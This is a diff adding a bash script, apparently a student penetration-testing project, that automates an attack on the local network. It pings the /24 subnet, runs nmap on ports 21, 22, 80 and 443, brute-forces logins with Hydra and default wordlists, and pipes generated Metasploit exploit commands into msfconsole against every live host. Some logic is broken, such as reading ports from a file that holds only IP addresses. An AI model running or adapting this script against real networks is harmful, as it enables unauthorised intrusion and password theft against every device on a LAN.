@@ -1,0 +1,184 @@
+#!/bin/bash
+
+# Function to print colored text
+function print_color() {
+    local color_code="$1"
+    local message="$2"
+    echo -e "\e[${color_code}m${message}\e[0m"
+}
+
+#scannig the network
+function scan_lan() {
+    print_color "36" "Scanning LAN..."
+    fping -aq -g "$(ip route | awk '/default/ {print $3}' | cut -d '.' -f1-3).0/24" > lan_scan_result.txt
+    print_color "32" "LAN scan completed."
+}
+
+#finding potential vulnerabilities for each live host
+function find_vulnerabilities() {
+    local live_hosts="$1"
+    print_color "36" "Finding potential vulnerabilities..."
+    for host in $live_hosts; do
+        nmap -p21,22,80,443 -sV --open -oN "vulnerabilities_$host.txt" "$host"
+    done
+    print_color "32" "Vulnerability scan completed."
+}
+
+# function to wait for vulnerability files to be generated
+function wait_for_vulnerabilities() {
+    for host in $LIVE_HOSTS; do
+        while [ ! -f "vulnerabilities_$host.txt" ]; do
+            sleep 1
+        done
+    done
+}
+
+# prompt user input 
+function prompt_input() {
+    local prompt_message="$1"
+    local default_value="$2"
+    read -rp "$prompt_message (default: $default_value): " user_input
+    echo "${user_input:-$default_value}"
+}
+
+# function for Passwords Usage
+ function passwords_usage() {
+    local user_list="$1"
+    local password_list="$2"
+    local login_service_found=false
+
+    for host in $LIVE_HOSTS; do
+        while [ ! -f "vulnerabilities_$host.txt" ]; do
+            sleep 1
+        done
+
+        login_service=$(grep -E "21/open|22/open|80/open|443/open" "vulnerabilities_$host.txt" | awk '{print $5}' | head -n 1)
+        if [ -n "$login_service" ]; then
+            if ! "$login_service_found"; then
+                login_service_found=true
+                brute_force_hydra "$LIVE_HOSTS" "$user_list" "$password_list"
+            fi
+        fi
+    done
+
+    if ! "$login_service_found"; then
+        print_color "36" "No login service available."
+    fi
+}
+
+# performing brute force using Hydra
+function brute_force_hydra() {
+    local live_hosts="$1"
+    local user_list="$2"
+    local password_list="$3"
+    print_color "36" "Starting Brute Force with Hydra..."
+    for host in $live_hosts; do
+        login_service=$(grep -E "21/open|22/open|80/open|443/open" "vulnerabilities_$host.txt" | awk '{print $5}' | head -n 1)
+        if [ -n "$login_service" ]; then
+            hydra -L "$user_list" -P "$password_list" "$host" "$login_service" -t 4
+        fi
+    done
+    print_color "32" "Brute Force with Hydra completed."
+}
+
+# performing exploits using Metasploit
+function perform_exploits() {
+    local live_hosts="$1"
+    local msf_commands
+
+    print_color "36" "Generating Metasploit Framework commands..."
+    for host in $live_hosts; do
+    
+        open_ports=$(grep " $host " lan_scan_result.txt | awk '{print $3}')
+
+        for port in $open_ports; do
+            case $port in
+                21)
+                    msf_commands+="use exploit/unix/ftp/proftpd_modcopy_exec\n"
+                    msf_commands+="set RHOSTS $host\n"
+                    msf_commands+="set RPORT $port\n"
+                    msf_commands+="run -j\n"
+                    ;;
+                22)
+                    msf_commands+="use exploit/linux/ssh/unauth_file_upload\n"
+                    msf_commands+="set RHOSTS $host\n"
+                    msf_commands+="set RPORT $port\n"
+                    msf_commands+="run -j\n"
+                    ;;
+                80)
+                    msf_commands+="use exploit/multi/http/php_include\n"
+                    msf_commands+="set RHOSTS $host\n"
+                    msf_commands+="set RPORT $port\n"
+                    msf_commands+="run -j\n"
+                    ;;
+                443)
+                    msf_commands+="use exploit/linux/http/symantec_web_gateway_user_portal\n"
+                    msf_commands+="set RHOSTS $host\n"
+                    msf_commands+="set RPORT $port\n"
+                    msf_commands+="run -j\n"
+                    ;;
+            esac
+        done
+    done
+    print_color "32" "Metasploit Framework commands generated."
+
+    execute_metasploit "$msf_commands"
+}
+
+function execute_metasploit() {
+    local msf_commands="$1"
+    echo "$msf_commands" | msfconsole -q -r /dev/stdin 2> /dev/null
+}
+
+
+# displaying general statistics
+function display_statistics() {
+    local scan_time=$(date)
+    local number_of_devices=$(wc -l < lan_scan_result.txt)
+    print_color "36" "Scan time: $scan_time"
+    print_color "36" "Number of found devices: $number_of_devices"
+}
+
+# saveing results
+function save_report() {
+    print_color "36" "Saving results to report.txt..."
+    # Add a short delay to ensure the vulnerability files are generated
+    sleep 2
+    cat vulnerabilities_*.txt > report.txt
+    sleep 1
+    print_color "32" "Results saved to report.txt."
+}
+
+
+#displaying findings for a specific IP address
+function display_findings() {
+    local ip_address="$1"
+    if [ -n "$ip_address" ]; then
+        grep -F "$ip_address" report.txt
+    else
+        echo "No IP address provided. Skipping display of findings."
+    fi
+}
+
+scan_lan
+LIVE_HOSTS=$(cut -d ' ' -f1 lan_scan_result.txt)
+find_vulnerabilities "$LIVE_HOSTS"
+
+user_list_default="/usr/share/wordlists/nmap.lst"
+user_list=$(prompt_input "$(print_color 33 'Enter the path to the user list (Press Enter for default):')" "$user_list_default")
+
+password_list_default="/usr/share/wordlists/john.lst"
+password_list=$(prompt_input "$(print_color 33 'Enter the path to the password list (Press Enter for default):')" "$password_list_default")
+
+[ -z "$password_list" ] && password_list=$(prompt_input "$(print_color 33 'Enter passwords one per line (Press Ctrl+D to finish):')")
+
+passwords_usage "$user_list" "$password_list"
+
+perform_exploits "$LIVE_HOSTS"
+
+display_statistics
+
+save_report
+
+ip_address=$(prompt_input "$(print_color 33 'Enter an IP address to display findings (Press Enter to skip)')")
+display_findings "$ip_address"
